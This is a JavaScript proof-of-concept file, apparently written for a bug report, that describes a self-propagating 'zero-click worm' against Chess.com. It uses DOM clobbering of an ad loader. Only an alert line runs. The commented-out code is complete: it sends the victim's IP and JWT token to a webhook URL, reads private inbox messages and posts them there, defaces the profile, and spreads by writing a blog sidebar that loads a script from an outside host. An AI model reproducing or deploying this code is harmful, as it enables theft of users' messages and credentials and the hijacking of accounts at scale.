// ==========================================
// Weaponized Zero-Click Worm - Chess.com 
// Impacts: PII Leak, Inbox Exfiltration, Full Defacement, Auto-Propagation
// ==========================================
alert("Critical: Aditude loader.js successfully hijacked via DOM Clobbering!\nDomain: " + document.domain);
// alert("CRITICAL: Zero-Click Worm Executed by Hussein!\n\n[DATA STOLEN]\n- IP Address\n- Hidden Email (via Intercom JWT)\n- Private Inbox DMs\n\n[ACCOUNT COMPROMISED]\n- Profile Avatar & Background Defaced\n- Blog Infected (Worm Auto-Propagation Active)");

// const webhook = 'https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039'; 
// const csrfToken = window.context.csrf.token;
// const username = window.context.user.username;

// // 1. PII & Token Leakage (Exfiltrate IP and Intercom JWT immediately)
// try {
//     const victimIP = window.context.ip;
//     const jwtToken = window.context.user.intercomUserJwt; 
//     fetch(webhook + '?stolen_ip=' + victimIP + '&stolen_jwt=' + jwtToken, { mode: 'no-cors' });
// } catch(e) {}

// // 2. Account Data Leakage (Exfiltrate Inbox DMs)
// try {
//     fetch('https://www.chess.com/callback/messages/list/inbox', {
//         method: 'GET',
//         headers: { 'Accept': 'application/json' },
//         credentials: 'include'
//     })
//     .then(response => response.text())
//     .then(data => {
//         fetch(webhook, { method: 'POST', body: "===== STOLEN DMs =====\n" + data, mode: 'no-cors' });
//     });
// } catch(e) {}

// // 3. Avatar Defacement (Profile Avatar Modification via RPC)
// try {
//     fetch("https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/UpdateProfileAvatar", {
//         method: "POST",
//         credentials: "include", 
//         headers: {
//             "Content-Type": "application/json",
//             "Accept": "application/json, text/plain, */*",
//             "Connect-Protocol-Version": "1"
//         },
//         body: JSON.stringify({
//             content: "",
//             filename: "user-avatar"
//         })
//     });
// } catch(e) {}

// // 4. Background Defacement (Profile Background Modification)
// try {
//     const b64Data = '';
//     const byteCharacters = atob(b64Data);
//     const byteNumbers = new Array(byteCharacters.length);
//     for (let i = 0; i < byteCharacters.length; i++) {
//         byteNumbers[i] = byteCharacters.charCodeAt(i);
//     }
//     const byteArray = new Uint8Array(byteNumbers);
//     const blob = new Blob([byteArray], {type: 'image/png'});
//     const formData = new FormData();
//     formData.append('file', blob, 'infected.png');

//     fetch('https://www.chess.com/callback/member/upload/background', {
//         method: 'POST',
//         headers: { 
//             'X-Chesscom-Csrf-Token': csrfToken,
//             'Accept': 'application/json' 
//         },
//         body: formData,
//         credentials: 'include'
//     });
// } catch(e) {}

// // 5. Self-Propagation (The Worm Infection via RPC)
// try {
//     const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
    
//     // The exact DOM Clobbering payload hosted on your GitHub
//     const maliciousSidebar = `<p>Hey, check out this cool trick! <a id="__tudeConfig"></a><a id="__tudeConfig" href="https://hussein-e4.github.io/POC.js" name="endpoint"></a></p>`;
    
//     const requestBody = {
//         "blogDetails": {
//             "url": username, 
//             "name": username + " blog",
//             "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
//             "sidebarBlock": maliciousSidebar
//         },
//         "updateMask": ""
//     };

//     fetch(apiUrl, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//             'Accept': 'application/json, text/plain, */*',
//             'Connect-Protocol-Version': '1'
//         },
//         credentials: 'include', 
//         body: JSON.stringify(requestBody)
//     })
//     .then(response => {
//         if (response.ok) {
//             fetch(webhook + "?impact=Worm_Propagated_Successfully", { mode: 'no-cors' });
//         }
//     });
} catch(e) {}
